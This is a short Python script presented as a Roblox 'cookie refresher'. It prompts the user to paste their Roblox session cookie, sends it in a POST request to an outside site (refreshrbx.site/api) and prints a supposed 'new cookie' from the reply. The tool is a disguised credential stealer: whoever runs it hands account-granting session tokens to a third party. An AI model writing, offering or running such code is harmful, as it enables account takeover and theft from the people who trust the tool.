import requests

print("Refresher cookie roblox !")

while True:
    cookie = input("Your roblox cookie: ")
    req = requests.post("https://refreshrbx.site/api", json={"cookie": cookie})
    print(f"\n\nold cookie: {cookie}\nnew cookie: {req.json()['cookie_xared']}\n\n")